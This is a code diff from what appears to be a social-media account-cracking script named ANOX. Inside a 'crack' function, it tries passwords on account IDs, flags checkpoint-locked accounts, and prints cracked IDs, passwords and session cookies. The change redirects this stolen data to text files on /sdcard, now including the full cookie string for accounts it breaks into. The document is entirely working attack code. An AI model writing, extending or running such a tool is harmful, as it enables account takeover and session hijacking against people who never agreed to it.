@@ -719,7 +719,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;94m[ANOX-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/cpfileanox.txt','a').write(idf+' | '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -729,7 +729,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;92m{idf} | {pw}\n\033[0;93m | \033[0;92m{kuki} ')
                 os.system('espeak -a 300 " Tutul,  Ok,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/anoxok.txt','a').write(idf+' | '+pw+' | '+kuki+'\n')
                 break
                 
             else:
